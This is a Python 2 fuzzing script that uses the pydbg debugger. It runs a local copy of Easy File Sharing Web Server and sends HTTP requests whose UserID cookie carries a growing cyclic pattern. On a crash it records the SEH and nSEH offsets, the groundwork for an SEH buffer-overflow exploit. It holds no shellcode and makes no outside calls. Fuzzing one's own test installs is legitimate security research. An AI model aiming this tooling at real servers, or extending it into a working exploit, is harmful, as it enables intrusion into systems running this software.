# -*- coding: utf-8 -*-
import time
import sys
import socket
import cPickle
import os

from pydbg import *
from pydbg.defines import *

from util import *

PICKLE_NAME = "crash_info.pkl"

exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"

import threading
import time

host, port = "127.0.0.1", 80

global Running
global lock
global chance
global MAX_OFFSET
global OFFSET

chance = 2
Running = True
lock = threading.Lock()

def check_access_validation(dbg):
	global chance
	global Running
	global lock

	with lock:
		if dbg.dbg.u.Exception.dwFirstChance:
			chance -= 1
			# prevent test next size.
			Running = False
			if chance==0:
				Running = False
				for seh_handler, nseh_handler in dbg.seh_unwind():
					seh, nseh = seh_handler, nseh_handler
					seh_offset = pattern_find(seh, MAX_OFFSET)
					if seh_offset!=-1:
						break
				
				print "[+] crash in %d words" % OFFSET
				print "[+] seh offset %s." % seh_offset
				with open(PICKLE_NAME, "wb") as phase_file:
					cPickle.dump(OFFSET, phase_file)
					cPickle.dump(seh_offset, phase_file)
					cPickle.dump(seh, phase_file)
					cPickle.dump(nseh, phase_file)

				with open("crash.txt", "w") as f:
					f.write("seh: 0x%08x\n" % seh)
					f.write("nseh: 0x%08x\n" % nseh)
					f.write(dbg.dump_context(stack_depth=1000))
				dbg.terminate_process()
				return DBG_EXCEPTION_NOT_HANDLED
			else:
				Running = True
			return DBG_EXCEPTION_NOT_HANDLED

		return DBG_EXCEPTION_NOT_HANDLED

class Fuzzer(object):
	def __init__(self, exe_path, max_offset = 8000):
		self.exe_path = exe_path
		self.pid = None
		self.dbg = None
		global MAX_OFFSET
		MAX_OFFSET = max_offset
		# self.running = True
		
		self.dbgThread = threading.Thread(target=self.start_debugger)
		self.dbgThread.setDaemon(False)
		self.dbgThread.start()
		
		# Wait debugger start process
		while self.pid is None:
			time.sleep(1)
		
		self.monitorThread = threading.Thread(target=self.monitor_debugger)
		self.monitorThread.setDaemon(False)
		self.monitorThread.start()
			
	def monitor_debugger(self):
		global Running
		global OFFSET
		test_words = 0
		raw_input("[+] Please start the debugger...")
		while  Running and MAX_OFFSET>test_words:
			with lock:
				if not Running:
					break
				test_words += 100
				OFFSET = test_words
				print "[+] test %d words" % test_words
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				buffer = pattern_create(test_words)
				httpreq = (
					"GET /changeuser.ghp HTTP/1.1\r\n"
					"User-Agent: Mozilla/4.0\r\n"
					"Host:" + host + ":" + str(port) + "\r\n"
					"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
					"Accept-Language: en-us\r\n"
					"Accept-Encoding: gzip, deflate\r\n"
					"Referer: http://" + host + "/\r\n"
					"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"
					"Conection: Keep-Alive\r\n\r\n"
				)
				s.send(httpreq)
				s.close()

				# prevent execute to fast.
				time.sleep(1)

		if not os.path.isfile(PICKLE_NAME):
			print "[+] No found bug."
			Running = False
			self.dbg.terminate_process()
		else:
			print "[+] Find bug."
			
	'''
		Try to start debugger and run it.
	'''
	def start_debugger(self):
		try:
			self.dbg = pydbg()
			self.dbg.load(self.exe_path)
			self.pid = self.dbg.pid
		except pdx:
			print "[+] Can't open file, please check file path"
			sys.exit(1)
		except Exception as e:
			print "[+] Unknow error: ", str(e)
			sys.exit(1)

		self.dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, check_access_validation)
		self.dbg.run()
		
exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"
Fuzzer(exe_path)